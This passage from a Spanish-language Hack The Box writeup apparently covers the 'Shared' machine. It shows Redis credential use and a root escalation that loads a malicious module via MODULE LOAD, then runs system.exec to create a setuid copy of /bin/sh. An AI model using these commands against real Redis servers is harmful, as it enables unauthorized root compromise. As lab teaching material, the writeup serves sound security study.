<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8;font-style:inherit;--shiki-dark-font-style:italic">$4</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">auth</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">$16</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">REDACTED</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span></span></code></pre> 
<p>Se pasan las cadenas auth y [REDACTED]. Dadas las circunstancias, la segunda cadena parece que puede ser la contraseña, así que vamos a intentar usarla con el comando redis-cli en la máquina de destino.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># dan_smith@shared.htb (SSH)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">redis-cli</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -a</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$password</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> INFO</span><span style="color:#B56959;--shiki-dark:#C3E88D"> server</span></span></code></pre> 
<p>El comando de servidor INFO se ejecuta correctamente. Mientras ejecutamos algunos comandos de enumeración adicionales descubrimos que el almacén de redis está prácticamente vacío.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># dan_smith@shared.htb (SSH)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">redis-cli</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -a</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$password</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> INFO</span><span style="color:#B56959;--shiki-dark:#C3E88D"> keyspace</span></span></code></pre> 
<p>Después de algunas investigaciones sobre redis, nos encontramos con esta página que presenta diferentes métodos para lograr RCE en un servidor <code>redis</code>. Esto es útil para nosotros porque el usuario que ejecuta el servidor redis es root, lo que significa que ejecutaremos comandos como root si RCE es posible.</p>
<p>Un método es cargar un archivo especial de objetos compartidos usando la consulta MODULE LOAD. Podemos construir el objeto compartido desde este código fuente en la máquina atacante, luego copiar <code>module.so</code> al objetivo.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># james_mason@shared.htb (SSH)</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">command</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">cp /bin/sh /root_sh;chmod a+xs /root_sh</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">redis-cli</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -a</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$password</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> MODULE</span><span style="color:#B56959;--shiki-dark:#C3E88D"> LOAD</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ~/module.so</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">	redis-cli</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -a</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$password</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> system.exec</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$command</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/root_sh</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -p</span></span></code></pre> 
<p>Ejecutar esto nos debe aterrizar un shell como root donde la última bandera se puede encontrar en <code>/root/root.txt</code></p> </div> <!-- related posts --> <footer> <h2 class="font-bold text-lg dark:text-white mb-6">Related Posts</h2> <section class="flex flex-col md:flex-row sm:justify-between gap-8"> <div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.QlzOxquK_12zkJG.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Broker - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/broker/"> Broker - HTB Writeup </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.R-ZwdRw5_Z1hxbOg.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Crafty - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/crafty/"> Crafty - HTB Writeup </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.262ecYt-_1fWT2n.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Devvortex - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/devvortex/"> Devvortex - HTB Writeup </a> </header> </div> </section> </footer> </article> </div>  </div> </article>  <footer class="flex justify-center items-center w-full px-16 h-28 border-t-2">
&copy; 2024 Fullaw4ke. All rights reserved.
</footer> </main>    </body> </html> 